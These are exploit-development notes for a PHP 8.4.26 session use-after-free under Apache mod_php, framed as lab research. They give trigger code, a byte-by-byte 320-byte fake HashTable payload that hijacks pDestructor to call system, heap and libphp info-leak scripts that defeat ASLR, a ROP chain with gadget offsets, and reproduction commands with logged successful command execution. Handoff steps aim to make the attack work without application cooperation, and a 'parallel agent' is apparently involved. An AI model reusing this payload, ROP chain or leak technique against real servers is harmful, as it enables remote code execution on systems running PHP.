# PHP 8.4.26 session vulnerability reproduction notes (Apache/mod_php, no-ASLR)

Date: 2026-10-21
Working directory: `/Users/my/php2shell`
Remote lab machine: `debian@172.16.1.112` (Debian 12, amd64, kernel 6.1.0-48)

---

## 1. Summary of conclusions

### 1.1 Achieved

- On **unmodified PHP 8.4.26 source** (self-compiled from the official tarball), Apache 2.4.68 prefork + mod_php, with **ASLR disabled**, we obtained real command execution.
- Command: `system("id>/tmp/x")`; the file actually written:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 5 consecutive independent requests all succeeded (prefork respawns the worker after each crash).
- gdb hits:

```text
SYSTEM rdi=0x7ffff5e045a0 cmd=id>/tmp/x
#0  __libc_system (line=0x7ffff5e045a0 "id>/tmp/x")
#1  zend_hash_destroy (ht=0x7ffff5e04580)
#2  zend_array_destroy (ht=0x7ffff5e04580)
#3  zend_hash_clean (ht=0x7ffff5e031c0)
#4  zif_session_unset
...
```

- ASLR control: normal `apache2ctl start` (personality=0) fails; `setarch x86_64 -R apache2ctl start` (personality=0x40000) succeeds.

### 1.2 Trigger method (this approach)

The exploit script `tools/d.php` is a test page with a `__destruct` method:

```php
session_start();
$_SESSION["x"] = new X($fp, $payload);   // X::__destruct writes to $_SESSION
for ($i = 0; $i < 7; $i++) $_SESSION["k".$i] = "v";
session_unset();                         // key: zend_hash_clean on the array still referenced by $_SESSION
```

`session_unset()` → `zend_hash_clean($_SESSION array)`. When cleaning reaches object X it calls `X::__destruct`; the destructor writes `$_SESSION["pwn"]`, triggering `zend_hash_do_resize()` on the same HashTable and freeing the old `arData`; the outer `zend_hash_clean` continues iterating with the `p/end` cached before entering the loop, producing a heap-use-after-free. The destructor then uses `stream_bucket_new()` to allocate a fully content-controlled 320-byte raw buffer that reclaims the just-freed `arData` chunk; clean continues to treat this data as Buckets and finally reaches the fake HashTable's `pDestructor = system`.

> **Boundary**: this is the weaponization of "Defect D"; it requires the target script to call `session_unset()` and to have a destructor that writes `$_SESSION` (or an equivalent gadget in the application). It is not a "pure `session.upload_progress`, zero application cooperation" internet-facing exploit chain. See Section 5 for progress on the upload_progress approach.

---

## 2. Lab environment

### 2.1 PHP build

```bash
mkdir -p ~/php-lab && cd ~/php-lab
curl -sL -o php-8.4.26.tar.gz https://www.php.net/distributions/php-8.4.26.tar.gz
tar xzf php-8.4.26.tar.gz && cd php-8.4.26
./configure --prefix=/opt/php8426 --with-apxs2=/usr/bin/apxs2 \
  --enable-mbstring --with-openssl --with-zlib --with-curl --with-sqlite3 \
  --with-zip --disable-opcache --enable-ctype --enable-filter --enable-json --enable-session
make -j16 && sudo make install
```

Build outputs: `/usr/lib/apache2/modules/libphp.so`, `/opt/php8426/bin/php` (`PHP 8.4.26 (cli) (NTS)`).

### 2.2 Apache

- `mpm_prefork`, single worker: `StartServers 1 / MinSpareServers 1 / MaxSpareServers 1 / ServerLimit 1 / MaxRequestWorkers 1 / MaxConnectionsPerChild 0`.
- `KeepAlive Off`, listening on `127.0.0.1:8088`, DocumentRoot `/home/debian/php-lab/www`.
- Key PHP configuration (`/etc/apache2/conf-available/php8426.conf`):

```apache
php_admin_value memory_limit 8M
php_admin_value post_max_size 64M
php_admin_value upload_max_filesize 64M
php_admin_value session.save_path /tmp
php_admin_value session.use_strict_mode 0
php_admin_value session.use_cookies 0
php_admin_value session.upload_progress.enabled On
php_admin_value session.upload_progress.cleanup On
```

> `memory_limit 8M` is to make the upload_progress approach OOM reliably; the RCE approach itself does not depend on that value.

### 2.3 Disabling ASLR

```bash
sudo apache2ctl -k stop
sudo bash -c 'ulimit -c unlimited; setarch $(uname -m) -R /usr/sbin/apache2ctl -k start'
# verify
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
```

With ASLR disabled, fresh workers with the same configuration have stable addresses (see the address table in Section 4).

---

## 3. Defect D: session tree cleanup reentrancy → arData UAF

### 3.1 Call chain

```text
zif_session_unset()                     ext/session/session.c
  zend_hash_clean(ht = $_SESSION array)   Zend/zend_hash.c
    ht->pDestructor(&p->val)            // process object X, call X::__destruct
      X::__destruct()
        $_SESSION["pwn"] = ...          // write back to the same array
          zend_hash_do_resize(ht)       // table full, grow
            pemalloc(new arData)
            memcpy(new arData, old arData, nNumUsed)
            pefree(old arData)          // ★ old arData freed
        stream_bucket_new(fp, payload320) // ★ 320-byte raw buffer reclaims old arData
      // back in the zend_hash_clean loop:
      p++ continues iterating over the reclaimed old arData   // ★ UAF, reads attacker-controlled Bucket
        ht->pDestructor(&p->val)         // ZVAL_PTR_DTOR
          zend_array_destroy(fake_ht)
            zend_hash_destroy(fake_ht)
              fake_ht->pDestructor(&fake_val)  // = system
                system("id>/tmp/x")     // ★ RCE
```

Key source:

- `session_unset()`: `ext/session/session.c` (`PHP_FUNCTION(session_unset)`, around lines 2756–2773 in 8.4.26).
- `zend_hash_clean()`: `Zend/zend_hash.c` around lines 1885–1932; the loop uses local `Bucket *p, *end` and continues with `++p` after `pDestructor` returns.
- `zend_hash_do_resize()`: `Zend/zend_hash.c:1327`; after growing, `pefree(old_data, ...)`.
- `zend_array_destroy()`: `Zend/zend_hash.c:1815`; `zend_hash_destroy()`: `Zend/zend_hash.c:1734`.
- `stream_bucket_new()`: `ext/standard/user_filters.c:472`; `pemalloc(buffer_len)` followed by `memcpy`, content fully controllable, and the bucket resource keeps it alive.
- The dtor-before-store window of `zend_hash_update_ind`: `_zend_hash_add_or_update_i()` in `Zend/zend_hash.c`, around line 872.

### 3.2 Measured addresses (this build, this configuration, no-ASLR worker)

| Object | Address |
|---|---|
| session HashTable A | `0x7ffff5e031c0` |
| A's arData (8 buckets) | `0x7ffff5e04540` |
| Start S of the 320-byte allocation chunk containing arData | `0x7ffff5e04500` |
| fake zval (clean's bucket 1) | `S+0x60 = 0x7ffff5e04560` |
| fake HashTable | `S+0x80 = 0x7ffff5e04580` |
| fake Bucket / command string | `S+0xa0 = 0x7ffff5e045a0` |
| libc `system` | `0x7ffff7d13490` |
| `ps_globals` | `0x7ffff56c2880` |
| `executor_globals` | `0x7ffff56d8380` |

Measured A has `nTableSize=8`, `nTableMask=0xfffffff0` (hash area 0x40 bytes), so `arData = S+0x40`. This matches `g17_clean_mask.log`.

### 3.3 320-byte payload layout

The payload lands at `S = 0x7ffff5e04500` as a raw buffer from `stream_bucket_new()`. Bucket 0 of the clean loop is object X (after destruction, clean still reads its `key`, located at `S+0x58`, which must be 0); bucket 1 is at `arData+0x20 = S+0x60`.

| Offset | Content | Description |
|---|---|---|
| `0x00–0x3f` | 0 | hash prefix area not read by clean |
| `0x40–0x5f` | 0 | bucket 0 val/h; `0x58` is bucket 0 key and must be 0 |
| `0x60` | `S+0x80` (8 bytes) | bucket 1 fake zval.value → fake HashTable |
| `0x68` | `0x307` (8 bytes) | zval type_info = IS_ARRAY_EX |
| `0x70` | 0 | bucket 1 h |
| `0x78` | 0 | bucket 1 key |
| `0x80` | `01 00 00 00 07 00 00 00` | fake HashTable gc: refcount=1, type=IS_ARRAY |
| `0x88` | `10 00 00 00 f8 ff ff ff` | flags=HASH_FLAG_STATIC_KEYS(16), nTableMask=0xfffffff8 |
| `0x90` | `S+0xa0` | fake HashTable.arData |
| `0x98` | `01 00 00 00 01 00 00 00` | nNumUsed=1, nNumOfElements=1 |
| `0xa0` | `"id>/tmp/"` | fake Bucket.val.value (first 8 bytes of the command) |
| `0xa8` | `0x78` (8 bytes) | fake zval type_info: low byte `'x'`, followed by 0 → command ends with `x\0` |
| `0xb0` | `system` address | fake HashTable.pDestructor |

`zend_hash_destroy(fake_ht)` enters the `HT_HAS_STATIC_KEYS_ONLY` + `HT_IS_WITHOUT_HOLES` branch and calls `pDestructor(&p->val)`, i.e. `system(S+0xa0)`; the string is `id>/tmp/x`.

> The fake HashTable's `HT_GET_DATA_ADDR` is `arData - 32 = S+0x80` (not the allocation start), so after system returns `pefree()` may abort/corrupt the heap; the command has already executed before the abort and the proof file has been written. If a "clean return" is needed, place the fake HashTable at S and point arData to another controllable allocation chunk, or use two `stream_bucket_new` calls to provide the HT and data separately (see Section 7).

### 3.4 Reproduction evidence

- 5/5 run output (remote):

```text
RUN 1 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
...
RUN 5 OK: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- ASLR control:

```text
ASLR_ON: personality=00000000
ASLR_ON_FAIL_AS_EXPECTED
ASLR_OFF: personality=00040000
ASLR_OFF_OK: uid=33(www-data) ...
```

- Full gdb evidence: `logs/g16_system_trace.log`.
- Old arData content/landing point during UAF: `logs/g15_uaf_memory.log`.
- Real array mask/allocation start: `logs/g17_clean_mask.log`.

---

## 4. `session.upload_progress` cross-request research track (independent reproduction progress)

This section is the main path from the intelligence. This approach has been reproduced to the point of **state persisting across requests + a reproducible crash**, but the fake HashTable chain has not yet been fully migrated over; however, the mechanism, addresses, and harness are all confirmed.

### 4.1 Request A: OOM bailout leaves cross-request state

Request A (`tools/sup_poc.py a`):

- `Content-Type: multipart/form-data`, field order:
  1. `PHPSESSID=attacksessionid0001`
  2. `PHP_SESSION_UPLOAD_PROGRESS=pwn`
  3. file field (triggers `MULTIPART_EVENT_FILE_START`, session initialization)
  4. approximately 12MB normal field (triggers `memory_limit` OOM after session initialization)
- Measured: returns 200 + `Allowed memory size of 8388608 bytes exhausted`, and the session file `/tmp/sess_attacksessionid0001` (321 bytes) has been written.
- gdb trace shows:
  - `php_request_startup` is entered;
  - at `php_session_track_init`, `PS(http_session_vars)=NULL` (first initialization in this request);
  - after OOM, `php_request_shutdown` / `zend_deactivate` / `shutdown_memory_manager` are **not** hit.
- After the request ends, `ps_globals` still retains:

```text
ps_globals.http_session_vars: type=0x10a (IS_REFERENCE), ptr=0x7ffff5e02320
  0x7ffff5e02320: refcount=2, val=0x7ffff5e03230 (IS_ARRAY)
ps_globals.id: 0x7ffff5e600c0
ps_globals.session_status: active(1)
```

`refcount=2` corresponds to the first reference from `ZVAL_NEW_REF` plus one reserved by `Z_ADDREF_P` for the symbol table; this indicates that `_SESSION` in the symbol table is still present and the request heap was not shut down normally.

### 4.2 Request B: END cleanup bypasses FILE_START's rinit

Request B (`tools/sup_poc.py b`) sends only:

- `PHPSESSID`
- `PHP_SESSION_UPLOAD_PROGRESS`
- **no file field**

Thus `php_rinit_session(0)` in `MULTIPART_EVENT_FILE_START` is not triggered; at `MULTIPART_EVENT_END`:

```text
php_session_rfc1867_callback(MULTIPART_EVENT_END)
  php_session_rfc1867_cleanup()
    php_session_initialize()
      php_session_track_init()
```

`php_session_track_init()` first does `zend_delete_global_variable("_SESSION")`. `_SESSION` in the symbol table is **IS_INDIRECT** pointing to `PS.http_session_vars`:

- `zend_hash_del_ind()` follows the indirect, sets the target zval to UNDEF and calls the dtor; **the bucket itself remains**.
- Then `zend_hash_update_ind()` finds this indirect bucket again, follows it to `PS.http_session_vars`, and calls `pDestructor` on `data` **before storing** (the dtor-before-store window of `_zend_hash_add_or_update_i`).

gdb observations:

```text
TRACK psvars=0x7ffff5e02320 ti=10a
PS_DTOR type=10a ptr=0x7ffff5e02320     # old reference rc 2 -> 1
PS_DTOR type=10a ptr=0x7ffff5e01240     # update_ind calls dtor on the newly created reference
TRACK psvars=0x7ffff5e01240 ti=0
REF_DESTROY 0x7ffff5e01240 rc=0 val=0x7ffff5e02150 ti=307
ARR_DESTROY arr=0x7ffff5e02150 flags=8 numused=0 ...
...
SIGSEGV in _IO_new_fclose(fp=0xffffffff)   # script file handle already corrupted when php_handler tears down
```

Request B also emits:

```text
PHP Request Startup: Session ID is too long or contains illegal characters
PHP Request Startup: Failed to read session data: files (path: /tmp)
```

The reason is that `PS.id` still points to request A's freed `zend_string`, and B's END cleanup uses it directly instead of `progress->sid`.

### 4.3 What is still missing

- The cross-request path can already obtain: dangling `PS.http_session_vars` reference, dangling `PS.id` `zend_string`, symbol-table indirect bucket, `update_ind` dtor-before-store, reproducible SIGSEGV/SIGABRT.
- But the "controlled 320-byte arData reclaim + fake HashTable" has not been connected to this path. The reasons:
  - Request B's END cleanup happens before script execution; although attacker-controlled multipart field allocations happen before it, the array/reference addresses created by `track_init` and the free order differ from Defect D;
  - Request B's first `track_init` decrements the old reference rc 2→1 (no destruction); only the second call, the in-script `session_start()`, triggers `zend_delete_global_variable`/`REF_DESTROY`;
  - this path often ends with a corrupted stream/file handle (`fclose(0xffffffff)`), not a controllable `pDestructor`.
- Reusable components: 320-byte raw spray via `stream_bucket_new()`, fake zval/fake HashTable layout, `system` address, address stability under no ASLR.

---

## 5. Relation to the previous-stage intelligence

The chain in the previous-stage screenshot is:

```text
Request A (upload_progress + OOM)
Request B (same worker, RFC1867 buffer reclaim)
zval_ptr_dtor → zend_array_destroy → pDestructor → zend_call_function → zif_system
```

This investigation independently reproduced **the same family of internal session defects** and achieved:

- `session_unset → zend_hash_clean → object destructor writes to $_SESSION → resize frees arData → UAF`;
- reclaiming the UAF chunk with a 320-byte raw buffer from `stream_bucket_new`;
- the full RCE chain fake zval → fake HashTable → `pDestructor=system`.

The difference is that this approach uses `session_unset()` + `__destruct` as the trigger/reentry mechanism, whereas the previous stage claimed to use pure upload_progress cross-request memory layout to forge the HashTable directly. The two can be merged: reuse this approach's fake HashTable payload on the upload_progress approach, or conversely replace this approach's application-level destructor with the previous stage's cross-request primitive.

---

## 6. Reproduction commands (from scratch)

### 6.1 Environment

See Section 2. Confirm:

```bash
/opt/php8426/bin/php -v           # PHP 8.4.26
curl -sI http://127.0.0.1:8088/   # X-Powered-By: PHP/8.4.26
sudo cat /proc/$(pgrep -f "^/usr/sbin/apache2 -k start" | tail -1)/personality
# 00040000
```

### 6.2 Deploying the PoC

```bash
scp tools/d.php debian@172.16.1.112:/home/debian/php-lab/d.php
ssh debian@172.16.1.112
sudo cp /home/debian/php-lab/d.php /home/debian/php-lab/www/d.php
sudo chown www-data:www-data /home/debian/php-lab/www/d.php
sudo rm -f /tmp/x
curl -s --max-time 8 http://127.0.0.1:8088/d.php >/dev/null
cat /tmp/x
```

### 6.3 upload_progress A/B harness

```bash
scp tools/sup_poc.py debian@172.16.1.112:/home/debian/php-lab/
ssh debian@172.16.1.112
cd ~/php-lab
python3 sup_poc.py a   # Request A: OOM, leaving cross-request state
python3 sup_poc.py b   # Request B: END cleanup, observe crash/warnings
```

> By default, the B request in `sup_poc.py` has no file field; this is exactly the key to bypassing `php_rinit_session(0)`. Adding the `B_REF_HEX` / `B_HT_HEX` environment variables appends `ref`/`ht` fields to B for subsequent heap-spray experiments.

---

## 7. Recommended next steps (handoff)

1. **Connect the fake HashTable to the upload_progress approach**
   - Place 320-byte-class allocations in request B's multipart fields/boundaries, and observe the chunks freed/reclaimed around `php_session_track_init` during END cleanup;
   - reuse this approach's payload layout, but re-measure A/arData/S addresses (B's allocation sequence differs).
2. **Make the RCE "cleaner"**
   - Place the fake HashTable at S (the allocation start), with `arData=S+0x40`, mask=0xfffffff0, so that `HT_GET_DATA_ADDR=S`; use another `stream_bucket_new` to provide a separate data chunk, avoiding double free/interior free.
3. **ASLR bypass**
   - The previous-stage intelligence mentions leaking the heap base with mbstring; this approach's `stream_bucket_new` layout and `system` offset can be reused directly. First obtain the heap base, then compute S/A; obtain the libc base with an arbitrary leak or format-string primitive.
4. **PHP-FPM**
   - Defect D is a single-request primitive; if an FPM application calls `session_unset()` and has a destructor that writes `$_SESSION`, it should in theory apply equally. Cross-request PS residue does not apply to FPM (the worker is replaced after bailout, as confirmed in the previous stage).
5. **Version coverage**
   - These notes are based on 8.4.26. The previous stage claims 5.4/5.6/7.4/8.5 have similar primitives; to write a 1day report, the HashTable/GC layout and `stream_bucket_new` availability must be re-measured on each version.

---

## 8. Key files/log index

| Path | Content |
|---|---|
| `tools/d.php` | no-ASLR RCE PoC (hardcoded addresses + 320B payload) |
| `tools/sup_poc.py` | upload_progress A/B multipart harness |
| `logs/g16_system_trace.log` | full backtrace of the gdb hit on `system("id>/tmp/x")` |
| `logs/g15_uaf_memory.log` | memory after the old arData is reclaimed by the 320B spray chunk |
| `logs/g17_clean_mask.log` | real session array `nTableMask=0xfffffff0`, allocation start |
| `src/php-8.4.26/` | official source (for analysis) |

---

## 9. Notes and risks

- `/tmp/x`, `/tmp/destruct_done`, `/tmp/core.*` may remain on the remote lab machine; clean them with `sudo rm -f` before testing.
- This PoC depends on a fixed PHP build/configuration/startup order; after changing the build, gadget offsets and the S offset must be re-measured.
- The no-ASLR version (`tools/d.php`) hardcodes the `system` address; the ASLR version (Section 10) computes it dynamically from two leaks and does not need a hardcoded base address.
- This line's "RCE" is an application-level trigger (`session_unset` + destructor). Do not describe it in external reporting as a "pure upload_progress, no application cooperation" exploit; the pure RCE on the upload_progress approach still requires the merge work in Section 7.

---

## 10. ASLR bypass (solved)

Goal: achieve the same Defect D RCE under `personality=0` (normal ASLR), without relying on `/proc/self/maps` or a debugger.

### 10.1 Two leak primitives

#### Leak 1: Zend MM 2MB chunk base (775 bytes containing heap pointers)

With `session.serialize_handler=php_serialize`, `session_encode()` → `php_var_serialize(&buf, Z_REFVAL(PS(http_session_vars)))`; this path does **not** have the `PS_ENCODE_LOOP` array-copy protection that GH-16590 added for the `php` serializer (still triggerable in 8.4.26):

```php
class C {
    function __serialize() {
        $_SESSION = [];                 // free the session array currently being serialized
        $leak = [0x41424344, 0x45464748];
        $GLOBALS['keepref'] =& $leak;   // zend_reference, reclaims the freed 32B string chunk
        return [];
    }
}
session_start();
$_SESSION['Lz'] = new C;
$_SESSION['s'] = str_repeat('A', 7); // zend_string allocation = 24+8 = 32B
for ($i=0;$i<8;$i++) $_SESSION['k'.$i] = $i;
$s = session_encode();
```

The serializer continues iterating over the freed old session array; the 32B chunk pointed to by the old string zval is reclaimed by a `zend_reference`, and the reference's `val.type_info=0x307` (IS_ARRAY) is treated as the zend_string's `len=775`, so `session_encode()` returns a 775-byte out-of-bounds read.

- The 775-byte payload contains several canonical heap pointers (e.g., no-ASLR `0x7ffff5e023a0`, ASLR `0x7fd3e62013a0`).
- `ptr & ~0x1fffff` on any one pointer yields the 2MB-aligned Zend MM chunk base.
- It matches exactly the 2MB-aligned anonymous `rw-p` mapping in `/proc/<pid>/maps` (ASLR example: `0x7fd3e6200000-0x7fd3e6400000`).
- Script: `tools/leak.php`.

#### Leak 2: libphp base (controlled-length 32KB OOB read)

Also `php_serialize` + `session_encode()`, but the old session array contains a 4050-byte string S (corresponding to the 4096-byte bin). In `__serialize()`, after freeing the session, allocate a 4096-byte raw buffer with `stream_bucket_new()` to reclaim S and write a fake `zend_string` header:

```text
offset 0: gc.refcount=1, gc.type_info=IS_STRING
offset 8: h=0
offset 16: len=32768
offset 24: data ("LEAKMARK" etc.)
```

The serializer treats S as a string of length 32768 and copies 32KB starting at S+24, crossing the 4096-byte buffer into adjacent heap; at a fixed offset `0x1fe8` (8168) in the output is a libphp code pointer.

- Measured ASLR: `anchor=0x7f17fe3b6309` → `libphp_base = anchor - 0x5b6309 = 0x7f17fde00000`, exactly matching the r--p start of `libphp.so` in `/proc/<pid>/maps`.
- After a new master restart, the anchor changes (e.g., `0x7fd3e7fb6309` → base `0x7fd3e7a00000`), and the formula still holds.
- Script: `tools/leak_libc.php?mode=file_first`.

### 10.2 ASLR-adaptive Defect D ROP

Full driver `tools/aslr_run2.py`:

1. Request `/leak.php`, parse the 775 bytes, take `hb = mode(ptr & ~0x1fffff)`.
2. Request `/leak_libc.php?mode=file_first`, take the qword at payload offset `0x1fe8`, `lb = anchor - 0x5b6309`.
3. Compute `S = hb + 0x3780` (this value is the arData allocation-start offset measured under no ASLR for **the `dyn_payload.php` request after the two leak requests**; different scripts/request orders need re-measurement).
4. Generate a 320-byte payload (Python `struct.pack`, 640 hex chars) and send it to `/dyn_payload.php` via `?p=`; PHP only does one `hex2bin`, keeping the same allocation pattern as the calibration script.
5. In the payload:
   - `bucket1` fake zval: `value=S+0x80`, `type=0x307`.
   - fake HashTable @ `S+0x80`: `flags=HASH_FLAG_STATIC_KEYS(16)`, `nTableMask=0xfffffff8`, `arData=S+0xa0`, `nNumUsed=nNumOfElements=1`.
   - `pDestructor = lb + 0x21ef23` (libphp `leave; ret`).
   - When `zend_hash_destroy` calls `pDestructor(&p->val)`, `RBP = end = arData + nNumUsed*32 = S+0xc0`; `leave;ret` pivots the stack to payload `S+0xc0`.
   - ROP:
     ```text
     S+0xc0: 0
     S+0xc8: lb + 0x15e492  (pop rdi; ret)
     S+0xd0: S + 0x120      ("id>/tmp/x")
     S+0xd8: lb + 0x15d1a3  (pop rsi; ret)
     S+0xe0: S + 0x130      ("r")
     S+0xe8: lb + 0x15a029  (ret; alignment)
     S+0xf0: lb + 0x1504d0  (popen@plt)
     S+0xf8: lb + 0x155780  (exit@plt)
     ```
   - Uses only libphp addresses; no libc base needed; `popen` is resolved by libphp's PLT.
6. The command `id>/tmp/x` executes synchronously and the proof file is written; then `exit`/the worker exits.

### 10.3 Measured results under ASLR

Current master (`personality=0`):

```text
anchor 0x7f17fe3b6309 hb 0x7f17fc600000 lb 0x7f17fde00000 S 0x7f17fc603780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(3/3 consecutive)
```

After restarting a fresh Apache master (all base addresses re-randomized):

```text
anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
(2/2 consecutive)
```

Note: under the same Apache master, prefork children inherit the same Zend MM chunk / libphp mappings, so hb/lb remain the same after worker recreation; they change only after the master restarts, and the leak adapts again.

### 10.4 Limitations and cautions

- Leaks 1/2 depend on `session.serialize_handler=php_serialize` (the script can `ini_set` it, or the application itself uses that serializer). The default `php` serializer has been fixed by GH-16590 and no longer leaks.
- The `libphp_base` anchor offset `0x5b6309`, gadget/PLT offsets, and `S_OFF=0x3780` are all bound to this experiment's PHP 8.4.26 build and request shape; a different build/script requires recalibration.
- This line is still an application-level trigger (`session_unset` + destructor); the leak scripts are userland PHP code in the same application. To turn it into "pure upload_progress, no application cooperation", the cross-request chain from Section 7 must be merged with the ROP endpoint from this section.
- The directory also contains a parallel agent's `/proc/self/maps` variant (`tools/d_aslr.php`, `tools/maps.php`, `tools/calibrate.py`, etc.), which relies on the application being able to read `/proc/self/maps`; this section's leak scheme does not depend on file reads.
